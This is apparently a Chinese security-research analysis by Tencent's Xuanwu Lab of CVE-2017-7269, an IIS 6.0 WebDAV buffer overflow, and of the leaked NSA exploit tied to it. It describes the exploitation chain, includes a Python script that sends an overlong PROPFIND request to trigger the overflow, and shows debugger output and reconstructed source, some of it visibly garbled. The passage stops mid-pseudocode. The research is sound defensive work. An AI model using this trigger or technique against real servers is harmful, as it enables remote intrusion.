来源：[玄武实验室](http://xlab.tencent.com/cn/2017/04/18/nsa-iis-vulnerability-analysis/)  
作者: **Ke Liu of Tencent’s Xuanwu Lab**
## 1\. 漏洞简介
### 1.1 漏洞简介
2017年3月27日，来自华南理工大学的 Zhiniang Peng 和 Chen Wu 在 GitHub
[[1](https://github.com/edwardz246003/IIS_exploit)] 上公开了一份 IIS 6.0
的漏洞利用代码，并指明其可能于 2016 年 7 月份或 8 月份被用于黑客攻击活动。
该漏洞的编号为 CVE-2017-7269 [[2](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269)]，由恶意的 `PROPFIND` 请求所引起：当 `If` 字段包含形如
`` 的超长URL时，可导致缓冲区溢出（包括栈溢出和堆溢出）。
微软从 2015 年 7 月 14 日开始停止对 Windows Server 2003 的支持，所以这个漏洞也没有官方补丁，0patch
[[3](https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html)] 提供了一个临时的解决方案。
无独有偶，Shadow Brokers 在2017年4月14日公布了一批新的 NSA 黑客工具，笔者分析后确认其中的 **Explodingcan** 便是
CVE-2017-7269 的漏洞利用程序，而且两个 Exploit 的写法如出一辙，有理由认为两者出自同一团队之手：
  * 两个 Exploit 的结构基本一致；
  * 都将 Payload 数据填充到地址 `0x680312c0`；
  * 都基于 `KiFastSystemCall / NtProtectVirtualMemory` 绕过 DEP；
本文以 3 月份公布的 Exploit 为基础，详细分析该漏洞的基本原理和利用技巧。
### 1.2 原理概述
  * `CStackBuffer` 既可以将栈设置为存储区（少量数据）、也可以将堆设置为存储区（大量数据）；
  * 为 `CStackBuffer` 分配存储空间时，误将 **字符数** 当做 **字节数** 使用，此为漏洞的根本原因；
  * 因为栈上存在 `cookie`，不能直接覆盖返回地址；
  * 触发溢出时，改写 `CStackBuffer` 对象的内存，使之使用地址 `0x680312c0` 作为存储区；
  * 将 Payload 数据填充到 `0x680312c0`；
  * 程序存在另一处类似的漏洞，同理溢出后覆盖了栈上的一个指针使之指向 `0x680313c0`；
  * `0x680313c0` 将被当做一个对象的起始地址，调用虚函数时将接管控制权；
  * 基于 `SharedUserData` 调用 `KiFastSystemCall` 绕过 DEP；
  * URL 会从 UTF-8 转为 UNICODE 形式；
  * Shellcode 使用 Alphanumeric 形式编码（UNICODE）；
# 2\. 漏洞原理
### 2.1 环境配置
在 Windows Server 2003 R2 Standard Edition SP2 上安装 IIS 并为其启用 **WebDAV** 特性即可。
修改 Exploit 的目标地址，执行后可以看到 `svchost.exe` 启动 `w3wp.exe` 子进程，后者以 `NETWORK SERVICE`
的身份启动了 `calc.exe` 进程 。 ![CVE-2017-7269
IIS远程代码执行漏洞exploit](https://images.seebug.org/content/images/2017/04/iis-exploit.jpg-w331s)
### 2.2 初步调试
首先，为进程 `w3wp.exe` 启用 **PageHeap** 选项；其次，修改 Exploit 的代码，去掉其中的
Shellcode，使之仅发送超长字符串。
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.75.134',80))
    pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
    pay+='If: \r\n\r\n'
    sock.send(pay)
执行之后 IIS 服务器上会启动 `w3wp.exe` 进程（并不会崩溃），此时将 WinDbg 附加到该进程并再次执行测试代码，即可在调试器中捕获到
**first chance** 异常，可以得到以下信息：
  * 在 `httpext!ScStoragePathFromUrl+0x360` 处复制内存时产生了堆溢出；
  * 溢出的内容和大小看起来是可控的；
  * 被溢出的堆块在 `httpext!HrCheckIfHeader+0x0000013c` 处分配；
  * 崩溃所在位置也是从函数 `httpext!HrCheckIfHeader` 执行过来的；
  * 进程带有异常处理，因此不会崩溃；
    $$ 捕获 First Chance 异常
    0:020> g
    (e74.e80): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00005014 ebx=00002809 ecx=00000a06 edx=0781e7e0 esi=0781a7e4 edi=07821000
    eip=67126fdb esp=03fef330 ebp=03fef798 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
    httpext!ScStoragePathFromUrl+0x360:
    67126fdb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    0:006> r ecx
    ecx=00000a06
    0:006> db esi
    0781a7e4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a7f4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a804  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a814  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a824  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a834  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a844  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a854  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    $$ 目标堆块分配调用栈
    0:006> !heap -p -a edi
        address 07821000 found in
        _DPH_HEAP_ROOT @ 7021000
        in busy allocation (  DPH_HEAP_BLOCK:  UserAddr  UserSize - VirtAddr  VirtSize)
                                     7023680:   781e7d8      2828 -  781e000      4000
        7c83d97a ntdll!RtlAllocateHeap+0x00000e9f
        5b7e1a40 staxmem!MpHeapAlloc+0x000000f3
        5b7e1308 staxmem!ExchMHeapAlloc+0x00000015
        67125df9 httpext!CHeap::Alloc+0x00000017
        67125ee1 httpext!ExAlloc+0x00000008
        67125462 httpext!HrCheckIfHeader+0x0000013c
        6712561e httpext!HrCheckStateHeaders+0x00000010
        6711f659 httpext!CPropFindRequest::Execute+0x000000f0
        6711f7c5 httpext!DAVPropFind+0x00000047
        $$ ......
    $$ 调用栈
    0:006> k
    ChildEBP RetAddr  
    03fef798 67119469 httpext!ScStoragePathFromUrl+0x360
    03fef7ac 67125484 httpext!CMethUtil::ScStoragePathFromUrl+0x18
    03fefc34 6712561e httpext!HrCheckIfHeader+0x15e
    03fefc44 6711f659 httpext!HrCheckStateHeaders+0x10
    03fefc78 6711f7c5 httpext!CPropFindRequest::Execute+0xf0
    03fefc90 671296f2 httpext!DAVPropFind+0x47
    $$ ......
    $$ 异常可以被处理，因此不会崩溃
    0:006> g
    (e74.e80): C++ EH exception - code e06d7363 (first chance)
### 2.3 CStackBuffer
崩溃所在模块 `httpext.dll` 会多次使用一个名为 `CStackBuffer`
的模板，笔者写了一份类似的代码，以辅助对漏洞原理的理解。为了简单起见，默认存储类型为 `unsigned char`，因此省略了模板参数 `typename
T`。
`CStackBuffer` 的相关特性如下：
  * 默认使用栈作为存储空间，大小由模板参数 `SIZE` 决定；
  * 通过 `resize` 可以将堆设置为存储空间；
  * 通过 `fake_heap_size` 的最低位标识存储空间的类型；
  * 通过 `release` 释放存储空间；
  * 对象的内存布局依次为：栈存储空间、堆块大小成员、存储空间指针；
`CStackBuffer` 的源码如下：
    template
    class CStackBuffer
    {
    public:
        CStackBuffer(unsigned int size)
        {
            fake_heap_size = 0;
            heap_buffer = NULL;
            resize(size);
        }
        unsigned char* resize(unsigned int size)
        {
            if (size > 2  SIZE)
                {
                    release();
                    heap_buffer = (unsigned char*)malloc(size);
                    fake_heap_size |= 1;
                }
                else
                {
                    heap_buffer = buffer;
                }
                fake_heap_size = (4 * size) | (fake_heap_size & 3);
            }
            fake_heap_size |= 2;
            return heap_buffer;
        }
        void release()
        {
            if (fake_heap_size & 1)
            {
                free(heap_buffer);
                heap_buffer = NULL;
            }
        }
        unsigned char* get()
        {
            return heap_buffer;
        }
        unsigned int getFakeSize()
        {
            return fake_heap_size;
        }
    private:
        unsigned char buffer[SIZE];
        unsigned int fake_heap_size;
        unsigned char* heap_buffer;
    };
### 2.4 漏洞调试
根据之前的简单分析，可知 `HrCheckIfHeader` 是一个关键函数，因为：
  * 目标堆块是在这个函数中动态分配的；
  * 从这里可以执行到触发异常的函数 `ScStoragePathFromUrl`；
函数 `HrCheckIfHeader` 简化后的伪代码如下所示：
    int HrCheckIfHeader(CMethUtil *pMethUtil)
    {
        CStackBuffer buffer1;
        LPWSTR lpIfHeader = CRequest::LpwszGetHeader("If", 1);
        IFILTER ifilter(lpIfHeader);
        LPWSTR lpToken = ifilter->PszNextToken(0);
        while (1)